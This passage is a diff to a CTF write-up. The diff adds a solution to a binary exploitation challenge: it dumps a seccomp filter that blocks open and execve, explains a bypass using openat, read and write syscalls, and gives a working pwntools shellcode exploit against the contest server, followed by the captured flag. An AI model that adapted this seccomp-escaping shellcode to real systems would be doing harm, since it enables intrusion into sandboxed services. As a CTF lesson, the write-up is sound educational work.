@@ -1,7 +1,7 @@
 # National Cyber Security Congress
 
 [Securiday](https://www.facebook.com/Securiday-104756755537130/) qualifiation round, hosted by [Securinets](https://www.facebook.com/Securinets), a 24 hour CTF. Top #10 teams will be able to compete in Securiday CTF.<br/>
-I've participated in the CTF as a member of Enthousiast team. We ranked 22 out of 295 teams.<br />
+I've participated in the CTF as a member of Enthousiast team. We ranked 22 out of 295 teams internationally & 1st team in Tunisia.<br />
 I'll be sharing a writeup for the Binary Exploitation challenges.
 
 <br/>
@@ -166,3 +166,93 @@ We hit the breakpoint (`0x55555555530d <main+77>:	call   rdx`) & we step into th
 So in my case, the shell changed `rax` value to `0x142` which is `stub_execveat` code. If you're unfamiliar with the `syscall` instruction, basically it's a way for the binary to make **system calls** to the kernel to execute a specific function. Each function have it's own code ([SysCall functions list](http://shell-storm.org/shellcode/files/linux-4.7-syscalls-x64.html)), we use this code to identify which function we would like to call. We simply change the `rax` register to the function code we're seeking & set up our parameters for the function call then we use `syscall` instruction to execute it. Back to the topic, after changing the `rax` value & when we are about to make the system call, we get a crash: `Program terminated with signal SIGSYS, Bad system call.`
 
 So as expected, we can see that the `0x142` is included in our `sandbox` code so, as we expected, this is a system call filter. 
+
+So we'll need to find an other way to reach our flag without using the blacklisted syscalls, we can use `seccomp-tools` to get a better view for the blacklisted calls:
+
+```
+─$ seccomp-tools dump ./shellcraft  
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
+ 0005: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0013
+ 0006: 0x15 0x06 0x00 0x00000038  if (A == clone) goto 0013
+ 0007: 0x15 0x05 0x00 0x00000039  if (A == fork) goto 0013
+ 0008: 0x15 0x04 0x00 0x0000003a  if (A == vfork) goto 0013
+ 0009: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0013
+ 0010: 0x15 0x02 0x00 0x00000065  if (A == ptrace) goto 0013
+ 0011: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0013
+ 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0013: 0x06 0x00 0x00 0x00000000  return KILL
+```
+
+So, this is the first time I've come across this kind of challenge. After some digging up, I landed on a writeup which included a similar situation. The solution is writing your own assembly! Let's recheck our sys call list ([SysCall functions list](http://shell-storm.org/shellcode/files/linux-4.7-syscalls-x64.html)). We still have `read` & `write` calls authorized, if we dig more, we'll land on `sys_openat`. This function is similar to `open`, except that we can provide a reference directory. Looking up this function ([ref](https://linux.die.net/man/2/openat)), we can either provide an absolute path to our flag file OR we can play around with the `AT_FDCWD` value. Considering the first challenge, the flag path is `/home/ctf/flag.txt`, so if we can do the following call: `openat(NULL, "/home/ctf/flag.txt", O_RDONLY)`, we'll open our flag file & get a file descriptor for it. How can we use this?
+
+We'll have to write something like this:
+
+```C
+f = openat(NULL, "/home/ctf/flag.txt", O_RDONLY); // Open our flag file.
+read(f, our_adr, 0x50); // This size should be enough to read the flag.
+write(1, our_adr); // Write flag to STDOUT.
+```
+
+<br/>
+If you can read assembly code, you can skip these paragraphs since I'll be mainly explaining that code.
+
+As a start, we'll set our RAX to 0x101, which is `sys_openat` code. Then we'll need to set both RDI & RDX to 0 (equivalent to NULL) & finally we'll need to make RSI point to `/home/ctf/flag.txt` in the stack. If you're unfamiliar with calling convention for 64 bit architecture, RDI is used for passing the first argument, RSI for the second, RDX for the third. Now, how can we get RSI to point to our flag path? Heading back to GDB, we have our shell code address saved in RAX register & it's executing a `call rdx` to execute our shell, therefore, we can use this information before making any sys calls. We can move RAX value to RSI, add our payload's length to RSI & make sure to have our `/home/ctf/flag.txt` at the end of our payload. After that, we'll be able to make our syscall & we'll get the file descriptor in RAX.
+
+After that, we'll need to execute our `read` function. For that, we can use the same address pointed by RSI since we no longer need it & it's a writeable area. We'll also need to move RAX value (file descriptor) to RSI (first argument). And finally, we'll set RAX to 0 for the `read` sys call & RDX to 0x50 for the buffer size. Then execute our syscall.
+
+And the final part of the payload, we'll keep RSI untouched since it points to our flag, we'll change RAX to 1 (`write` sys call) & then set RDI to 1 (STDOUT file descriptor). We can do our sys call now.
+
+After finishing our payload, we'll end up with a 62 bytes assembly code. We head back to the first stage & add 62 to RSI value to make it point at the end of our payload ;)
+
+And the magic happens: `Securinets{56000a2e8205998dd69d74c30d6b1daca2863e66184c088b}`
+
+Payload:
+
+```python
+from pwn import *
+
+
+context.binary = './shellcraft'
+
+# NOPs are not really needed here, we can get rid of them but we'll have to update RSI value
+shellcode = b"\x90" * 5 + asm('''
+
+    mov rsi, rdx
+    add rsi, 62
+    mov rax, 0x101
+    xor rdi, rdi
+    xor rdx, rdx
+    syscall
+    
+    mov rdi, rax
+    mov rax, 0
+    mov rdx, 0x50
+    syscall
+    
+    mov rax, 1
+    mov rdi, 1
+    syscall
+
+        ''')
+
+payload = shellcode+b"/home/ctf/flag.txt\x00"
+
+#p = process('./shellcraft')
+p = remote('20.216.39.14', 1236)
+
+print('Shellcode length    :', len(shellcode))
+print('Payload             :', payload)
+
+p.sendline(payload)
+
+p.interactive()
+```
+
+* ### FTP
+
